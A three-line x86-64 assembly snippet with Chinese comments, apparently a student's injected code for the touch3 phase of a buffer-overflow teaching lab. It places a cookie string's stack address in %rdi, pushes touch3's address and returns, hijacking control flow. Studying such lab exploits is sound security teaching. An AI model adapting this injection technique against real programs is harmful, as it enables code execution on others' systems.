mov $0x5561dca0, %rdi # 将cookie字符串设置为第一个参数
push $0x4018fa 	# 将touch3函数地址压入栈中
ret